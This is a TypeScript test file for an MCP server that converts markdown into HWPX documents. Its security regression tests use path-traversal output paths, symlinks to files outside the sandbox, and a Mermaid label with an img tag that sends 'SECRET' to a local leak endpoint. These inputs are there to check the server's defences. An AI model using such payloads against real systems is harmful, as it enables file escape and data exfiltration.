import { existsSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import { describe, expect, it } from 'vitest';
import { createServer } from '../src/server';

const at = (p: string) => fileURLToPath(new URL(p, import.meta.url));
const TEMPLATES = at('../../../templates');
const UC = join(TEMPLATES, 'usecase');
const work = mkdtemp();
function mkdtemp() {
  return mkdtempSync(join(tmpdir(), 'yangsik-mcp-'));
}

async function connect(roots = [TEMPLATES, work]) {
  const server = createServer({ roots });
  const client = new Client({ name: 'test', version: '0' });
  const [a, b] = InMemoryTransport.createLinkedPair();
  await Promise.all([server.connect(a), client.connect(b)]);
  return client;
}
/** 도구를 호출해 JSON 결과(또는 오류 문장)를 돌려준다 */
async function call(client: Client, name: string, args: Record<string, unknown> = {}) {
  const r = (await client.callTool({ name, arguments: args })) as {
    content: { type: string; text: string }[];
    isError?: boolean;
  };
  const t = r.content[0].text;
  return { isError: !!r.isError, text: t, json: r.isError ? undefined : (JSON.parse(t) as Record<string, any>) };
}

describe('MCP 서버: 프로필 작성 도구', () => {
  it('도구 목록: 작성 도구와 변환 도구가 모두 있다', async () => {
    const c = await connect();
    const names = (await c.listTools()).tools.map((t) => t.name);
    for (const n of [
      'analyze_template',
      'list_kinds',
      'get_guide',
      'get_profile_schema',
      'check_profile',
      'test_profile',
      'preview_mapping',
      'list_doctypes',
      'get_md_template',
      'validate_md',
      'convert_md',
      'preview_output',
    ])
      expect(names).toContain(n);
  });

  it('analyze_template·list_kinds·get_guide는 코어와 같은 사실을 준다', async () => {
    const c = await connect();
    const facts = (await call(c, 'analyze_template', { template_path: join(UC, 'template.hwpx') })).json;
    expect(facts?.tables[0].labels).toContain('UC ID');
    expect((await call(c, 'list_kinds')).json?.kinds.map((k: { name: string }) => k.name)).toContain('rows');
    expect((await call(c, 'get_guide', { topic: 'errors' })).json?.markdown).toContain('label-not-found');
    expect((await call(c, 'get_profile_schema')).json?.type).toBe('object');
  });

  it('check_profile: 정상은 ok, 틀린 YAML 초안은 코드·후보와 함께 오류', async () => {
    const c = await connect();
    expect((await call(c, 'check_profile', { profile_path: join(UC, 'profile.yaml') })).json?.ok).toBe(true);
    const bad = readFileSync(join(UC, 'profile.yaml'), 'utf8').replace('유스케이스명:', '유스케이스 이름:');
    const r = (await call(c, 'check_profile', { profile_yaml: bad, template_path: join(UC, 'template.hwpx') })).json;
    expect(r?.ok).toBe(false);
    expect(r?.issues[0]).toMatchObject({ code: 'label-not-found' });
    expect(r?.issues[0].candidates).toContain('유스케이스명');
  });

  it('test_profile·preview_mapping: 드라이런과 대조표', async () => {
    const c = await connect();
    const t = (await call(c, 'test_profile', { profile_path: join(UC, 'profile.yaml') })).json;
    expect(t?.ok).toBe(true);
    expect(t?.mapping.items).toHaveLength(3);
    const m = (
      await call(c, 'preview_mapping', {
        profile_path: join(UC, 'profile.yaml'),
        md_text: readFileSync(join(UC, 'example.md'), 'utf8'),
      })
    ).json;
    expect(m?.items[0].id).toBe('UC-001');
  });
});

describe('MCP 서버: 변환 도구', () => {
  it('list_doctypes·get_md_template', async () => {
    const c = await connect();
    const doctypes = ((await call(c, 'list_doctypes')).json?.doctypes ?? []) as { type: string }[];
    const types = doctypes.map((d) => d.type);
    expect(types).toEqual(expect.arrayContaining(['usecase', 'class-spec', 'db-spec', 'report']));
    const tpl = (await call(c, 'get_md_template', { profile_path: join(UC, 'profile.yaml') })).json;
    expect(tpl?.rules).toContain("'{id} {name}'");
    expect(tpl?.example).toContain('## UC-001');
    expect(tpl?.schema).toBeDefined();
  });

  it('validate_md: 위반은 줄 번호와 함께, 고친 md는 통과 (작성→검증→수정 루프)', async () => {
    const c = await connect();
    const bad = (
      await call(c, 'validate_md', { profile_path: join(UC, 'profile.yaml'), md_path: join(UC, 'fixtures/bad1.md') })
    ).json;
    expect(bad?.ok).toBe(false);
    expect(bad?.violations[0]).toMatchObject({ line: 8 });
    const good = (
      await call(c, 'validate_md', {
        profile_path: join(UC, 'profile.yaml'),
        md_text: readFileSync(join(UC, 'example.md'), 'utf8'),
      })
    ).json;
    expect(good?.ok).toBe(true);
  });

  it('convert_md: md 본문으로 변환해 허용 폴더에 저장하고, 위반은 ok:false로 돌려준다', async () => {
    const c = await connect();
    const out = join(work, 'out/uc.hwpx');
    const r = (
      await call(c, 'convert_md', {
        profile_path: join(UC, 'profile.yaml'),
        md_text: readFileSync(join(UC, 'example.md'), 'utf8'),
        out_path: out,
        skip_diagrams: true,
      })
    ).json;
    expect(r).toMatchObject({ ok: true, items: 3 });
    expect(existsSync(out)).toBe(true);
    const bad = (
      await call(c, 'convert_md', {
        profile_path: join(UC, 'profile.yaml'),
        md_path: join(UC, 'fixtures/bad1.md'),
        out_path: join(work, 'out/bad.hwpx'),
      })
    ).json;
    expect(bad?.ok).toBe(false);
    expect(bad?.violations.length).toBeGreaterThan(0);
    expect(existsSync(join(work, 'out/bad.hwpx'))).toBe(false);
    const prev = (await call(c, 'preview_output', { file_path: out })).json;
    expect(prev?.svg).toContain('<svg');
  });

  it('convert_md formats:["hwp"]: 같은 이름의 .hwp(CFB)도 저장한다', async () => {
    const c = await connect();
    const r = (
      await call(c, 'convert_md', {
        profile_path: join(UC, 'profile.yaml'),
        md_text: readFileSync(join(UC, 'example.md'), 'utf8'),
        out_path: join(work, 'out/both.hwpx'),
        skip_diagrams: true,
        formats: ['hwpx', 'hwp'],
      })
    ).json;
    expect(r).toMatchObject({ ok: true, outHwp: expect.stringContaining('both.hwp'), hwp: { ok: true } });
    expect(readFileSync(join(work, 'out/both.hwp')).subarray(0, 4).toString('hex')).toBe('d0cf11e0');
    // 기본(formats 생략)은 .hwp를 만들지 않는다
    expect(existsSync(join(work, 'out/uc.hwp'))).toBe(false);
  });

  it('클래스 명세서도 같은 도구로 변환된다', async () => {
    const c = await connect();
    const dir = join(TEMPLATES, 'class-spec');
    const r = (
      await call(c, 'convert_md', {
        profile_path: join(dir, 'profile.yaml'),
        md_path: join(dir, 'example.md'),
        out_path: join(work, 'out/class.hwpx'),
        skip_diagrams: true,
      })
    ).json;
    expect(r?.ok).toBe(true);
  });
});

describe('MCP 서버: 파일 접근 제한', () => {
  it('허용 폴더 밖 읽기·쓰기, 경로 탈출, 없는 파일은 오류(isError)', async () => {
    const c = await connect();
    const outside = join(tmpdir(), 'yangsik-outside.md');
    writeFileSync(outside, '# x');
    expect((await call(c, 'validate_md', { profile_path: join(UC, 'profile.yaml'), md_path: outside })).isError).toBe(
      true,
    );
    expect(
      (
        await call(c, 'validate_md', {
          profile_path: join(UC, 'profile.yaml'),
          md_path: join(UC, '../../package.json'),
        })
      ).text,
    ).toContain('허용 폴더 밖');
    expect(
      (
        await call(c, 'convert_md', {
          profile_path: join(UC, 'profile.yaml'),
          md_text: '',
          out_path: join(tmpdir(), '..', 'escape.hwpx'),
        })
      ).isError,
    ).toBe(true);
    expect((await call(c, 'analyze_template', { template_path: join(UC, '없음.hwpx') })).text).toContain('파일이 없음');
  });

  it('상대 경로는 첫 허용 폴더 기준이다', async () => {
    const c = await connect([UC, work]);
    expect((await call(c, 'analyze_template', { template_path: 'template.hwpx' })).json?.tables).toBeDefined();
  });
});

describe('MCP 서버: stdio 실행(실제 프로세스)', () => {
  it('yangsik-mcp를 띄워 클라이언트로 도구를 호출한다. LLM 의존은 없다', async () => {
    const transport = new StdioClientTransport({
      command: 'node',
      args: [at('../bin/yangsik-mcp.mjs'), '--root', TEMPLATES],
    });
    const client = new Client({ name: 'stdio-test', version: '0' });
    await client.connect(transport);
    try {
      const r = await call(client, 'get_guide', { topic: 'overview' });
      expect(r.json?.markdown).toContain('프로필 작성 가이드');
    } finally {
      await client.close();
    }
    const pkg = JSON.parse(readFileSync(at('../package.json'), 'utf8')) as { dependencies: Record<string, string> };
    expect(Object.keys(pkg.dependencies).filter((d) => /langchain|anthropic|openai/.test(d))).toEqual([]);
  });
});

// ---- 독립 검토(S-29)에서 재현된 보안 결함의 회귀 시험 ----------------------------------------------
import { spawnSync } from 'node:child_process';
import { copyFileSync, mkdirSync, symlinkSync } from 'node:fs';
import { createServer as createHttpServer } from 'node:http';
import { findChromium } from '@yangsik/diagram/node';
import { zipEntryHashes } from '../../../packages/hwp/test/util/zip';

/** 허용 폴더(root)와 그 밖(outside)을 가진 시험 환경. root 안에 유스케이스 문서 유형을 복사해 둔다 */
function sandbox() {
  const base = mkdtempSync(join(tmpdir(), 'yangsik-sec-'));
  const root = join(base, 'root');
  const outside = join(base, 'outside');
  mkdirSync(join(root, 'uc'), { recursive: true });
  mkdirSync(outside, { recursive: true });
  for (const f of ['profile.yaml', 'template.hwpx', 'schema.json', 'example.md'])
    copyFileSync(join(UC, f), join(root, 'uc', f));
  return {
    base,
    root,
    outside,
    profile: join(root, 'uc/profile.yaml'),
    md: readFileSync(join(UC, 'example.md'), 'utf8'),
  };
}

describe('MCP 보안: 쓰기 경로', () => {
  it('존재하지 않는 중간 폴더 + .. 로 허용 폴더 밖에 쓰지 못한다', async () => {
    const sb = sandbox();
    const c = await connect([sb.root]);
    const out = `${sb.root}/nonexist-dir/../../outside/escaped.hwpx`;
    const r = await call(c, 'convert_md', {
      profile_path: sb.profile,
      md_text: sb.md,
      out_path: out,
      skip_diagrams: true,
    });
    expect(r.isError).toBe(true);
    expect(existsSync(join(sb.outside, 'escaped.hwpx'))).toBe(false);
    expect(existsSync(join(sb.root, 'nonexist-dir'))).toBe(false);
  });

  it('밖을 가리키는 심볼릭 링크(끊어진 링크 포함)와 .hwpx가 아닌 파일은 덮어쓰지 못한다', async () => {
    const sb = sandbox();
    const victim = join(sb.outside, 'victim.txt');
    writeFileSync(victim, 'ORIGINAL');
    symlinkSync(victim, join(sb.root, 'link.hwpx'));
    symlinkSync(join(sb.outside, 'not-yet.txt'), join(sb.root, 'dangle.hwpx'));
    const c = await connect([sb.root]);
    const args = { profile_path: sb.profile, md_text: sb.md, skip_diagrams: true };
    expect((await call(c, 'convert_md', { ...args, out_path: join(sb.root, 'link.hwpx') })).isError).toBe(true);
    expect(readFileSync(victim, 'utf8')).toBe('ORIGINAL');
    expect((await call(c, 'convert_md', { ...args, out_path: join(sb.root, 'dangle.hwpx') })).isError).toBe(true);
    expect(existsSync(join(sb.outside, 'not-yet.txt'))).toBe(false);
    const schema = join(sb.root, 'uc/schema.json');
    const before = readFileSync(schema, 'utf8');
    expect((await call(c, 'convert_md', { ...args, out_path: schema })).isError).toBe(true);
    expect(readFileSync(schema, 'utf8')).toBe(before);
  });
});

describe('MCP 보안: 프로필이 가리키는 경로와 읽기', () => {
  it('프로필의 schema·template이 허용 폴더 밖이면 convert_md도 거부한다', async () => {
    const sb = sandbox();
    writeFileSync(join(sb.outside, 'secret-schema.json'), '{"required":["apiKeyOutside"]}');
    writeFileSync(
      sb.profile,
      readFileSync(sb.profile, 'utf8').replace('schema: schema.json', 'schema: ../../outside/secret-schema.json'),
    );
    const c = await connect([sb.root]);
    const r = await call(c, 'convert_md', {
      profile_path: sb.profile,
      md_text: sb.md,
      out_path: join(sb.root, 'o.hwpx'),
      skip_diagrams: true,
    });
    expect(r.isError).toBe(true);
    expect(r.text).toContain('허용 폴더 밖');
    expect(r.text).not.toContain('apiKeyOutside');
    // 밖 양식도 마찬가지
    copyFileSync(join(UC, 'template.hwpx'), join(sb.outside, 'tpl.hwpx'));
    writeFileSync(
      sb.profile,
      readFileSync(join(UC, 'profile.yaml'), 'utf8').replace(
        'template: template.hwpx',
        'template: ../../outside/tpl.hwpx',
      ),
    );
    const r2 = await call(c, 'convert_md', {
      profile_path: sb.profile,
      md_text: sb.md,
      out_path: join(sb.root, 'o2.hwpx'),
      skip_diagrams: true,
    });
    expect(r2.isError).toBe(true);
    expect(existsSync(join(sb.root, 'o2.hwpx'))).toBe(false);
  });

  it('example.md·profile.yaml이 밖을 가리키는 링크면 내용을 돌려주지 않고, 끊어진 링크가 목록 전체를 깨지 않는다', async () => {
    const sb = sandbox();
    writeFileSync(join(sb.outside, 'secret.md'), 'hunter2');
    mkdirSync(join(sb.root, 'linked'));
    copyFileSync(join(UC, 'profile.yaml'), join(sb.root, 'linked/profile.yaml'));
    copyFileSync(join(UC, 'template.hwpx'), join(sb.root, 'linked/template.hwpx'));
    symlinkSync(join(sb.outside, 'secret.md'), join(sb.root, 'linked/example.md'));
    mkdirSync(join(sb.root, 'broken'));
    symlinkSync(join(sb.outside, 'missing.yaml'), join(sb.root, 'broken/profile.yaml'));
    const c = await connect([sb.root]);
    const tpl = await call(c, 'get_md_template', { profile_path: join(sb.root, 'linked/profile.yaml') });
    expect(tpl.json?.example).toBeNull();
    expect(tpl.text).not.toContain('hunter2');
    const list = await call(c, 'list_doctypes');
    expect(list.isError).toBe(false);
    expect(list.json?.doctypes.length).toBeGreaterThanOrEqual(2);
  });

  it('rhwp가 문자열을 던져도 isError 결과로 돌려준다(프로토콜 오류가 되지 않는다)', async () => {
    const sb = sandbox();
    writeFileSync(join(sb.root, 'bad.hwpx'), 'not a hwpx');
    const c = await connect([sb.root]);
    const r = await call(c, 'analyze_template', { template_path: join(sb.root, 'bad.hwpx') });
    expect(r.isError).toBe(true);
    expect(r.text.length).toBeGreaterThan(0);
  });
});

describe('MCP 실행 인자', () => {
  const run = (args: string[]) =>
    spawnSync('node', [at('../bin/yangsik-mcp.mjs'), ...args], { encoding: 'utf8', input: '', timeout: 20_000 });
  it('--root=경로·--root 경로는 받아들이고, 값 없는 --root나 알 수 없는 인자는 오류로 종료한다(현재 폴더 전체 허용 금지)', () => {
    const dir = mkdtempSync(join(tmpdir(), 'yangsik-root-'));
    expect(run([`--root=${dir}`]).stderr).toContain(dir);
    expect(run(['--root', dir]).stderr).toContain(dir);
    for (const bad of [['--root'], ['--root='], ['--root', '--other'], ['--rooot', dir], [dir]]) {
      const r = run(bad);
      expect(r.status, bad.join(' ')).toBe(1);
      expect(r.stderr).not.toContain('시작');
    }
  });
});

describe.runIf(findChromium() !== null)('Mermaid 렌더의 격리 (Chromium 필요)', () => {
  it('md의 다이어그램이 네트워크 요청을 보내지 못한다', async () => {
    const hits: string[] = [];
    const srv = createHttpServer((req, res) => {
      hits.push(req.url ?? '');
      res.end('x');
    });
    await new Promise<void>((r) => srv.listen(0, '127.0.0.1', r));
    const port = (srv.address() as { port: number }).port;
    try {
      const sb = sandbox();
      const md = sb.md.replace(
        /```mermaid\n[\s\S]*?```/,
        `\`\`\`mermaid\ngraph TD\n  A["<img src='http://127.0.0.1:${port}/leak?data=SECRET'>"] --> B\n\`\`\``,
      );
      const c = await connect([sb.root]);
      const r = await call(c, 'convert_md', {
        profile_path: sb.profile,
        md_text: md,
        out_path: join(sb.root, 'o.hwpx'),
      });
      expect(r.json?.mermaid).toBe(true);
      await new Promise((r) => setTimeout(r, 500));
      expect(hits).toEqual([]);
    } finally {
      srv.close();
    }
  }, 180_000);

  it('동시에 변환해도 서로의 다이어그램이 섞이지 않는다', async () => {
    const sb = sandbox();
    const withDiagram = (label: string) =>
      sb.md.replace(/```mermaid\n[\s\S]*?```/, `\`\`\`mermaid\ngraph TD\n  A[${label}] --> B[끝]\n\`\`\``);
    const c = await connect([sb.root]);
    const image = (f: string) => zipEntryHashes(new Uint8Array(readFileSync(f)))['BinData/image1.png'];
    const call1 = (label: string, out: string) =>
      call(c, 'convert_md', { profile_path: sb.profile, md_text: withDiagram(label), out_path: join(sb.root, out) });
    await call1('ALPHA', 'seqA.hwpx');
    await call1('BETA', 'seqB.hwpx');
    await Promise.all([call1('ALPHA', 'parA.hwpx'), call1('BETA', 'parB.hwpx')]);
    expect(image(join(sb.root, 'seqA.hwpx'))).not.toEqual(image(join(sb.root, 'seqB.hwpx')));
    expect(image(join(sb.root, 'parA.hwpx'))).toEqual(image(join(sb.root, 'seqA.hwpx')));
    expect(image(join(sb.root, 'parB.hwpx'))).toEqual(image(join(sb.root, 'seqB.hwpx')));
  }, 240_000);
});
